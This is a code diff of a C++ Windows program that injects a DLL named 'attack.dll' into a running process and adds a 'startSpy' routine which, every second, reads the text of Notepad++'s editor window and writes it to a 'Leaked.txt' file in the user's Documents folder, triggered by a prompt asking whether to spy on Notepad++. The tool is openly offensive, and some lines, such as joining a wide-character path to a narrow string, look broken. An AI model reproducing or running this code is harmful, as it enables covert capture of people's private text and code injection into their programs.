@@ -1,6 +1,9 @@
 #include <windows.h>
 #include <iostream>
-
+#include <string>
+#include <shlobj.h>
+#include <fstream>
+#include <knownfolders.h>  // for FOLDERID_Documents
 
 void InjectDLL(DWORD pid, LPCSTR dllPath) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -33,19 +36,55 @@ void InjectDLL(DWORD pid, LPCSTR dllPath) {
     VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
 }
 
-void startSpy(HWND hwnd) {
-    printf("yeah~~");
-    //char buffer[1024];
-    //while (true) {
-    //    HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
-    //    if (hEdit) {
-    //        SendMessageA(hEdit, WM_GETTEXT, sizeof(buffer), (LPARAM)buffer);
-    //        std::cout << buffer << std::endl;
-    //    }
-    //    Sleep(1000);
-    //}
-}
+//void startSpy(HWND hwnd) {
+//    
+//    std::string buffer;
+//    while (true) {
+//        HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
+//        if (hEdit) {
+//            SendMessageA(hEdit, WM_GETTEXT, sizeof(buffer), buffer);
+//            std::cout << buffer << std::endl;
+//        }
+//        Sleep(1000);
+//    }
+//}
 
+void startSpy(HWND hwnd) {
+    std::string previousText;
+
+    // Get the path to the "My Documents" folder
+    wchar_t myDocumentsPath[MAX_PATH];
+    HRESULT result = SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, myDocumentsPath);
+    if (result != S_OK) {
+        std::cerr << "Failed to get My Documents path." << std::endl;
+        return;
+    }
+    // Create the full path for the log file
+    std::string logFilePath = myDocumentsPath + L"\\Leaked.txt";
+    std::cout << logFilePath << std::endl;
+    while (true) {
+        HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
+        if (hEdit) {
+            LRESULT textLength = SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
+            if (textLength > 0) {
+                std::string buffer(textLength + 1, '\0');
+                SendMessageA(hEdit, WM_GETTEXT, (WPARAM)(textLength + 1), (LPARAM)buffer.data());
+                if (buffer != previousText) {
+                    std::ofstream logFile(logFilePath);
+                    if (logFile.is_open()) {
+                        logFile << buffer << std::endl;
+                        logFile.close();
+                    }
+                    else {
+                        std::cerr << "Failed to open log file." << std::endl;
+                    }
+                    previousText = buffer;
+                }
+            }
+        }
+        Sleep(1000);
+    }
+}
 int main()
 {
     const char* dllPath = "C:\\Users\\KOREA\\Desktop\\attack\\Release\\attack.dll";
@@ -66,13 +105,16 @@ int main()
         }
         Sleep(500);
     }
-    //printf("say 'y' when you want to spy on the notepad++: ");
-    //while (1) {
-    //    char isY;
-    //    scanf(" %c", &isY);
-    //    if (isY == 'y') startSpy(hwnd);
-    //    printf("say 'y' when you want to spy on the notepad++: ");
-    //}
+    printf("say 'y' when you want to spy on the notepad++: ");
+    while (1) {
+        char isY;
+        scanf(" %c", &isY);
+        if (isY == 'y') {
+            startSpy(hwnd);
+            break;
+        }
+        printf("say 'y' when you want to spy on the notepad++: ");
+    }
 ;
     return 0;
 }
